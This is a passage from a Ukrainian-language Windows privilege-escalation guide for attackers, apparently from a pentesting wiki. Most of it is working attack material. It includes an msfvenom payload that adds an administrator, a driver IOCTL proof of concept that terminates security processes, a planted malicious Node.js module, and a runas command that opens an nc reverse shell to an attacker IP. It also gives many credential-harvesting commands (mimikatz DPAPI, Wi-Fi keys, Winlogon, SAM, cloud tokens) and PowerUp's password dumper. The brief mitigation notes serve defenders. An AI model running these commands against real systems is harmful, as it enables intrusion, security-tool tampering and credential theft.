for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Ви можете виявити та експлуатувати** цю вразливість за допомогою metasploit: `exploit/windows/local/trusted\_service\_path` Ви можете вручну створити бінарний файл служби за допомогою metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Дії відновлення

Windows дозволяє користувачам указувати дії, які потрібно виконати, якщо служба виходить з ладу. Цю функцію можна налаштувати так, щоб вона вказувала на binary. Якщо цей binary можна замінити, може бути можливе підвищення привілеїв. Докладнішу інформацію наведено в [офіційній документації](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Встановлені Applications

Перевірте **permissions binary-файлів** (можливо, ви зможете перезаписати один із них і підвищити привілеї) і **папок** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Права на запис

Перевірте, чи можете ви змінити певний конфігураційний файл, щоб прочитати спеціальний файл, або змінити бінарний файл, який буде виконано обліковим записом Administrator (schedtasks).

Спосіб знайти слабкі дозволи для папок/файлів у системі:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Автоматичне завантаження plugin у Notepad++ для persistence/execution

Notepad++ автоматично завантажує будь-яку DLL plugin з підпапок `plugins`. Якщо доступна portable/copy інсталяція з правом запису, розміщення malicious plugin забезпечує автоматичне виконання коду всередині `notepad++.exe` під час кожного запуску (зокрема з `DllMain` і callback-функцій plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Запуск під час старту

**Перевірте, чи можете ви перезаписати якийсь реєстр або binary, який буде виконано іншим користувачем.**\
**Прочитайте** **наступну сторінку**, щоб дізнатися більше про цікаві **місця autoruns для підвищення привілеїв**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Драйвери

Шукайте можливі **сторонні підозрілі/вразливі** драйвери
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Якщо driver відкриває примітив довільного читання/запису kernel memory (поширено в погано спроєктованих IOCTL handlers), можна підвищити привілеї, безпосередньо викравши SYSTEM token із kernel memory. Покроковий опис техніки:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Для race-condition bugs, коли вразливий виклик відкриває контрольований атакувальником шлях Object Manager, навмисне сповільнення пошуку (за допомогою компонентів максимальної довжини або глибоких ланцюжків директорій) може збільшити вікно з мікросекунд до десятків мікросекунд:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Примітиви пошкодження пам’яті registry hive

Сучасні вразливості hive дають змогу створювати детерміновані розкладки, зловживати доступними для запису нащадками HKLM/HKU та перетворювати пошкодження metadata на переповнення kernel paged-pool без custom driver. Повний ланцюжок описано тут:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Confused type у direct-mode `RtlQueryRegistryValues` із контрольованих атакувальником шляхів

Деякі drivers приймають шлях до registry від userland, перевіряють лише те, що це коректний UTF-16 string, а потім викликають `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` із `RTL_QUERY_REGISTRY_DIRECT` у stack scalar, наприклад `int readValue`. Якщо `RTL_QUERY_REGISTRY_TYPECHECK` відсутній, `EntryContext` інтерпретується відповідно до **фактичного** типу registry, а не до типу, який очікував developer.

Це створює два корисні примітиви:

- **Confused deputy / oracle**: контрольований користувачем абсолютний шлях `\Registry\...` дає змогу driver опитувати вибрані атакувальником keys, розкривати їх існування через return codes/logs і іноді читати values, до яких caller не мав би прямого доступу.
- **Пошкодження kernel memory**: destination scalar, наприклад `&readValue`, інтерпретується з неправильним типом як `REG_QWORD`, `UNICODE_STRING` або sized binary buffer залежно від типу registry value.

Практичні примітки щодо exploitation:

- **Windows 8+ mitigation**: якщо query звертається до **untrusted hive** з `RTL_QUERY_REGISTRY_DIRECT`, але без `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers аварійно завершуються з `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Щоб зберегти exploitability, шукайте **attacker-writable keys усередині trusted system hives**, а не розміщуйте values у `HKCU`.
- **Trusted-hive staging**: використовуйте NtObjectManager для переліку writable descendants у `\Registry\Machine`, а потім повторно запустіть scan із duplicated **low-integrity** token, щоб знайти keys, доступні з sandboxed contexts:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: прямий запис 8 байтів у 4-байтовий `int` пошкоджує сусідні дані стека та може частково перезаписати розташований поруч callback/function pointer.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode очікує, що `EntryContext` вказує на `UNICODE_STRING`. Якщо код спочатку завантажує контрольований атакувальником `REG_DWORD` у скаляр стека, а потім повторно використовує той самий буфер для читання рядка, атакувальник контролює `Length`/`MaximumLength` і частково впливає на вказівник `Buffer`, отримуючи частково контрольований запис у kernel.
- **`REG_BINARY`**: для великих бінарних даних direct mode розглядає перший `LONG` за адресою `EntryContext` як розмір буфера зі знаком. Якщо попереднє читання `REG_DWORD` залишає від’ємне контрольоване атакувальником значення у повторно використаному скалярі, наступний запит `REG_BINARY` копіює байти атакувальника безпосередньо поверх сусідніх слотів стека, що часто є найпростішим шляхом до повного перезапису callback pointer.

Надійний патерн для пошуку: **різнорідні читання з registry в одну й ту саму змінну стека без її повторної ініціалізації**. Шукайте `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, повторно використані вказівники `EntryContext` і шляхи виконання, у яких перше читання з registry визначає, чи відбудеться друге читання.

#### Зловживання відсутністю FILE_DEVICE_SECURE_OPEN в об’єктах пристроїв (LPE + EDR kill)

Деякі підписані драйвери сторонніх виробників створюють об’єкт пристрою із сильним SDDL за допомогою IoCreateDeviceSecure, але забувають встановити FILE_DEVICE_SECURE_OPEN у DeviceCharacteristics. Без цього прапорця захищений DACL не застосовується, коли пристрій відкривається через шлях із додатковим компонентом, що дає змогу будь-якому непривілейованому користувачеві отримати handle, використовуючи namespace path на кшталт:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (з реального випадку)

Якщо користувач може відкрити пристрій, привілейованими IOCTL, які надає драйвер, можна зловживати для LPE і tampering. Приклади можливостей, що спостерігалися на практиці:
- Повертати handles із повним доступом до довільних процесів (викрадення token / SYSTEM shell через DuplicateTokenEx/CreateProcessAsUser).
- Необмежене raw disk read/write (offline tampering, persistence tricks під час завантаження).
- Завершувати довільні процеси, зокрема Protected Process/Light (PP/PPL), що дає змогу виконувати AV/EDR kill із user land через kernel.

Мінімальний PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- Завжди встановлюйте FILE_DEVICE_SECURE_OPEN під час створення об’єктів пристроїв, які мають бути обмежені за допомогою DACL.
- Перевіряйте контекст виклику для привілейованих операцій. Додавайте перевірки PP/PPL перед дозволом завершення процесу або повернення дескрипторів.
- Обмежуйте IOCTL (маски доступу, METHOD_*, перевірка вхідних даних) і розгляньте brokered models замість прямих привілеїв ядра.

Detection ideas for defenders
- Відстежуйте відкриття підозрілих імен пристроїв у user-mode (наприклад, \\ .\\amsdk*) і специфічні послідовності IOCTL, що вказують на зловживання.
- Застосовуйте Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) і підтримуйте власні allow/deny lists.


## PATH DLL Hijacking

Якщо у вас є **дозволи на запис у папку, присутню в PATH**, ви можете перехопити DLL, яку завантажує процес, і **підвищити привілеї**.

Перевірте дозволи для всіх папок у PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Щоб отримати додаткову інформацію про те, як зловживати цією перевіркою:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Перехоплення розв’язання модулів Node.js / Electron через `C:\node_modules`

Це варіант **неконтрольованого шляху пошуку у Windows**, який впливає на застосунки **Node.js** і **Electron**, коли вони виконують bare import, наприклад `require("foo")`, а очікуваний модуль **відсутній**.

Node шукає пакети, піднімаючись деревом каталогів і перевіряючи папки `node_modules` у кожному батьківському каталозі. У Windows цей пошук може дійти до кореня диска, тому застосунок, запущений із `C:\Users\Administrator\project\app.js`, може зрештою перевіряти:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Якщо **непривілейований користувач** може створити `C:\node_modules`, він може розмістити шкідливий `foo.js` (або папку пакета) і чекати, поки **процес Node/Electron із вищими привілеями** спробує розв’язати відсутню залежність. Payload виконується в контексті безпеки процесу-жертви, тому це стає **LPE**, якщо цільовий процес працює від імені адміністратора, із привілейованого запланованого завдання/сервісної оболонки або з автоматично запущеного привілейованого desktop-застосунку.

Це особливо поширено, коли:

- залежність оголошена в `optionalDependencies`
- стороння бібліотека обгортає `require("foo")` у `try/catch` і продовжує роботу у разі помилки
- пакет було видалено з production-збірок, пропущено під час пакування або не вдалося встановити
- вразливий `require()` міститься глибоко в дереві залежностей, а не в основному коді застосунку

### Пошук вразливих цілей

Використовуйте **Procmon**, щоб підтвердити шлях розв’язання:

- Встановіть фільтр `Process Name` = виконуваний файл цілі (`node.exe`, EXE-файл Electron-застосунку або процес-оболонка)
- Встановіть фільтр `Path` `contains` `node_modules`
- Зосередьтеся на `NAME NOT FOUND` і фінальному успішному відкритті в `C:\node_modules`

Корисні шаблони під час code review у розпакованих файлах `.asar` або вихідному коді застосунків:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Експлуатація

1. Визначте **назву відсутнього пакета** за допомогою Procmon або аналізу вихідного коду.
2. Створіть кореневий каталог пошуку, якщо він ще не існує:
```powershell
mkdir C:\node_modules
```
3. Розмістіть модуль із точно очікуваною назвою:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Запустіть застосунок-жертву. Якщо застосунок намагається виконати `require("foo")`, а легітимний модуль відсутній, Node може завантажити `C:\node_modules\foo.js`.

Реальні приклади відсутніх optional-модулів, що відповідають цьому шаблону, включають `bluebird` і `utf-8-validate`, але **техніка** є багаторазово застосовною частиною: знайдіть будь-який **відсутній bare import**, який привілейований процес Windows Node/Electron спробує розв’язати.

### Ідеї для виявлення та hardening

- Створюйте сповіщення, коли користувач створює `C:\node_modules` або записує туди нові `.js`-файли/пакети.
- Шукайте процеси з високим рівнем цілісності, які читають дані з `C:\node_modules\*`.
- Постачайте всі runtime-залежності разом із production-збіркою та перевіряйте використання `optionalDependencies`.
- Перевіряйте сторонній код на наявність тихих конструкцій на кшталт `try { require("...") } catch {}`.
- Вимикайте optional probes, якщо бібліотека це підтримує (наприклад, деякі розгортання `ws` можуть уникнути legacy probe для `utf-8-validate` за допомогою `WS_NO_UTF_8_VALIDATE=1`).

## Мережа

### Спільні ресурси
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### файл hosts

Перевірте інші відомі комп'ютери, жорстко задані у файлі hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Мережеві інтерфейси та DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Відкриті порти

Перевірте **обмежені служби** ззовні
```bash
netstat -ano #Opened ports?
```
### Таблиця маршрутизації
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Таблиця ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Правила брандмауера

[**Перевірте цю сторінку щодо команд, пов’язаних із брандмауером**](../basic-cmd-for-pentesters.md#firewall) **(перегляд правил, створення правил, вимкнення, вимкнення...)**

Більше[ команд для мережевої розвідки тут](../basic-cmd-for-pentesters.md#network)

### Підсистема Windows для Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Бінарний файл `bash.exe` також можна знайти за шляхом `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Якщо ви отримали права користувача root, ви можете слухати на будь-якому порту (під час першого використання `nc.exe` для прослуховування порту через GUI буде запитано, чи слід дозволити `nc` працювати через firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Щоб легко запустити bash від імені root, можна спробувати `--default-user root`

Ви можете переглянути файлову систему `WSL` у папці `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Облікові дані Winlogon

### Облікові дані Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Диспетчер облікових даних / Windows Vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault зберігає облікові дані користувачів для серверів, вебсайтів та інших програм, у які **Windows** може **автоматично входити від імені користувачі**в. Спочатку може здатися, що тепер користувачі можуть зберігати свої облікові дані Facebook, Twitter, Gmail тощо, щоб автоматично входити через браузери. Але це не так.

Windows Vault зберігає облікові дані, за допомогою яких Windows може автоматично входити від імені користувачів, тобто будь-яка **програма Windows, якій потрібні облікові дані для доступу до ресурсу** (сервера або вебсайту), **може використовувати цей Credential Manager** & Windows Vault і застосовувати надані облікові дані замість того, щоб користувачі щоразу вводили ім’я користувача та пароль.

Якщо програми не взаємодіють із Credential Manager, я не думаю, що вони можуть використовувати облікові дані для певного ресурсу. Отже, якщо ваша програма хоче використовувати сховище, вона має певним чином **взаємодіяти з диспетчером облікових даних і запитувати облікові дані для цього ресурсу** зі сховища за замовчуванням.

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Тоді можна використовувати `runas` із параметром `/savecred`, щоб скористатися збереженими обліковими даними. У наведеному нижче прикладі віддалений бінарний файл викликається через SMB-ресурс.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Використання `runas` із наданими обліковими даними.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Зверніть увагу на mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) або модуль [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)** надає метод симетричного шифрування даних, який переважно використовується в операційній системі Windows для симетричного шифрування асиметричних приватних ключів. Для цього шифрування використовується секрет користувача або системи, що суттєво впливає на ентропію.

**DPAPI забезпечує шифрування ключів за допомогою симетричного ключа, похідного від секретів входу користувача**. У сценаріях, що стосуються системного шифрування, використовуються секрети доменної автентифікації системи.

Зашифровані RSA-ключі користувача, зашифровані за допомогою DPAPI, зберігаються в каталозі `%APPDATA%\Microsoft\Protect\{SID}`, де `{SID}` — [ідентифікатор безпеки](https://en.wikipedia.org/wiki/Security_Identifier) користувача. **Ключ DPAPI, розташований разом із майстер-ключем, який захищає приватні ключі користувача в тому самому файлі**, зазвичай складається з 64 байтів випадкових даних. (Важливо зазначити, що доступ до цього каталогу обмежений, тому його вміст неможливо переглянути за допомогою команди `dir` у CMD, хоча це можна зробити через PowerShell.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Ви можете використати **mimikatz module** `dpapi::masterkey` із відповідними аргументами (`/pvk` або `/rpc`) для їх розшифрування.

**Файли облікових даних, захищені головним паролем,** зазвичай розташовані за адресою:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Ви можете використовувати **модуль mimikatz** `dpapi::cred` із відповідним `/masterkey` для розшифрування.\
Ви можете **витягти багато ** **головних ключів DPAPI** з **пам'яті** за допомогою модуля `sekurlsa::dpapi` (якщо ви маєте права root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Облікові дані PowerShell

**Облікові дані PowerShell** часто використовуються для **скриптингу** та завдань автоматизації як зручний спосіб зберігати зашифровані облікові дані. Облікові дані захищені за допомогою **DPAPI**, що зазвичай означає, що їх можна розшифрувати лише тим самим користувачем на тому самому комп'ютері, на якому їх було створено.

Щоб **розшифрувати** облікові дані PS із файлу, що їх містить, можна виконати:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Збережені RDP-підключення

Їх можна знайти в `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
та в `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Нещодавно виконані команди
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Диспетчер облікових даних віддаленого робочого стола**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Використовуйте модуль **Mimikatz** `dpapi::rdg` із відповідним `/masterkey`, щоб **розшифрувати будь-які .rdg-файли**\
Ви можете **витягнути багато головних ключів DPAPI** з пам’яті за допомогою модуля Mimikatz `sekurlsa::dpapi`

### Sticky Notes

Користувачі часто використовують застосунок Sticky Notes на робочих станціях Windows, щоб **зберігати паролі** та іншу інформацію, не усвідомлюючи, що це файл бази даних. Цей файл розташований за адресою `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`, і його завжди варто пошукати та перевірити.

### AppCmd.exe

**Зверніть увагу: щоб відновити паролі з AppCmd.exe, потрібно мати права адміністратора та запустити його з високим рівнем цілісності.**\
**AppCmd.exe** розташований у каталозі `%systemroot%\system32\inetsrv\`.\
Якщо цей файл існує, можливо, було налаштовано певні **облікові дані**, які можна **відновити**.

Цей код було взято з [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Перевірте, чи існує `C:\Windows\CCM\SCClient.exe` .\
Інсталятори **запускаються з привілеями SYSTEM**, багато з них вразливі до **DLL Sideloading (інформація з** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Файли та реєстр (облікові дані)

### Облікові дані Putty
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### SSH-ключі хостів PuTTY
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH-ключі в реєстрі

Приватні SSH-ключі можуть зберігатися в ключі реєстру `HKCU\Software\OpenSSH\Agent\Keys`, тож варто перевірити, чи є там щось цікаве:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Якщо ви знайдете будь-який запис у цьому шляху, імовірно, це буде збережений SSH-ключ. Він зберігається в зашифрованому вигляді, але його можна легко розшифрувати за допомогою [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Більше інформації про цю техніку наведено тут: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Якщо служба `ssh-agent` не запущена і ви хочете, щоб вона автоматично запускалася під час завантаження системи, виконайте:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Схоже, що ця техніка більше не працює. Я спробував створити кілька ssh keys, додати їх за допомогою `ssh-add` і увійти через ssh на машину. Реєстр HKCU\Software\OpenSSH\Agent\Keys не існує, а procmon не виявив використання `dpapi.dll` під час асиметричної автентифікації ключа.

### Файли unattended
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Також ви можете шукати ці файли за допомогою **metasploit**: _post/windows/gather/enum_unattend_

Приклад вмісту:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Резервні копії SAM і SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Хмарні облікові дані
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Знайдіть файл із назвою **SiteList.xml**

### Кешований пароль GPP

Раніше була доступна функція, яка дозволяла розгортати власні локальні облікові записи адміністраторів на групі машин через Group Policy Preferences (GPP). Однак цей метод мав значні недоліки безпеки. По-перше, Group Policy Objects (GPO), що зберігалися як XML-файли в SYSVOL, могли бути доступні будь-якому користувачу домену. По-друге, паролі в цих GPP, зашифровані за допомогою AES256 із використанням загальнодоступного задокументованого ключа за замовчуванням, могли бути розшифровані будь-яким автентифікованим користувачем. Це становило серйозний ризик, оскільки могло дозволити користувачам отримати підвищені привілеї.

